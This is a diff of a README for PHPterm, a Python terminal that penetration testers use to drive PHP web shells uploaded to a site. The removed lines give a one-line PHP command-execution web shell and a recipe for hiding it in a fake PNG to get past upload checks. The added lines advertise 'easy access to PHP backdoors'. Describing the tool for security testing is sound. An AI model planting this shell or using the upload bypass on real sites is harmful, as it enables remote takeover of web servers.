@@ -1,29 +1,46 @@
-# PHP-Term
-![434513902-3930a006-4bf9-4257-bd3c-8fef646412b2 (1)](https://github.com/user-attachments/assets/5137d278-4c6d-48ef-94be-c952e2c87680)
+<h1 align="center" id="title">PHPterm</h1>
 
+<p align="center"><img src="https://socialify.git.ci/PowerCmptr/PHPterm/image?language=1&amp;name=1&amp;owner=1&amp;pattern=Circuit+Board&amp;theme=Dark" alt="project-image"></p>
 
-A terminal for penetration testers, to connect to an uploaded php payload. (Made with Python).
-The payload itself is one simple PHP code line to give the tester access to a remote reverse shell through unsanitized uplaod features of a website.
-It looks like this:
+<p id="description">A terminal for penetration testers to connect to an uploaded php payload. (Made with Python). The payload itself is one simple PHP code line to give the tester access to a remote reverse shell through unsanitized uplaod features of a website.</p>
+
+<h2>Project Screenshots:</h2>
+
+<img src="https://github.com/PowerCmptr/PHP-Term/blob/main/screenshots/ss1.png?raw=true" alt="project-screenshot" width="400" height="400/">
+
+<img src="https://github.com/PowerCmptr/PHP-Term/blob/main/screenshots/ss2.png?raw=true" alt="project-screenshot" width="400" height="400/">
+
+  
+  
+<h2>🧐 Features</h2>
+
+Here're some of the project's best features:
+
+*   Easy access to PHP backdoors
+*   Auto-fetching the file system
+*   Auto command completion
+*   Colored output for readability
+*   Auto-fetching the user using whoami command
+
+<h2>🛠️ Installation Steps:</h2>
+
+<p>1. Make the file executable</p>
+
 ```
-<?php system(\$_GET['cmd']); ?>"
+chmod +x PHPterm_1.1
 ```
 
-To further test for sanitized uploads you can use this to create fake PNG files.
-E. x.:
-Create an empty PNG formatted file:
+<p>2. Execute the program</p>
+
 ```
-printf "\x89PNG\r\n\x1a\n" > payload.png
+./PHPterm_1.1
 ```
 
-Append PHP-Payload:
-```
-echo "<?php system(\$_GET['cmd']); ?>" >> payload.png
-```
+  
+  
+<h2>💻 Built with</h2>
 
-Give it a PHP alias:
-```
-mv payload.png payload.png.php
-```
+Technologies used in the project:
 
-This will also work with different file formats and might help you to sanitize the uploads properly.
+*   PHP
+*   Python
